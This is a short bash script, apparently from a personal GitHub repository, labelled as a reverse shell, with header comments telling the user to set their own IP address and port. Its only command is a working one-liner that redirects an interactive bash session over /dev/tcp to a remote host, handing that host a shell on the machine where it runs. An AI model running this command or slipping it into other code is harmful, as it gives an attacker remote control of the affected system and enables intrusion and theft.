# XORPIOv BASH SHELL | A Reverse Shell in BASH.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

bash -i >& /dev/tcp/10.0.22.8/2222 0>&1
